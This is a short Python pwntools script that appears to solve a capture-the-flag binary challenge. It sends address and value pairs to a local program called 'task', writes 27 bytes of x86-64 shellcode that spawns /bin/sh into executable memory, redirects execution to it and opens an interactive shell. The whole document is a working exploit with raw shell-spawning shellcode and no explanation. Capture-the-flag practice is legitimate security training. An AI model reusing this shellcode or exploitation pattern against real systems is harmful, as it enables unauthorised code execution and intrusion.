from pwn import *

r = process('./task')
#r = remote("0.0.0.0", 31342)
r.sendline(str(0x40123F))
r.sendline(str(0xAB))

sc_addr = 0x401240
sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

for c in range(len(sc)):
        r.sendline( str(sc_addr+c) )
        r.sendline(str(sc[c]))

r.sendline(str(0x4011DA))
r.sendline(str(0))

r.interactive()
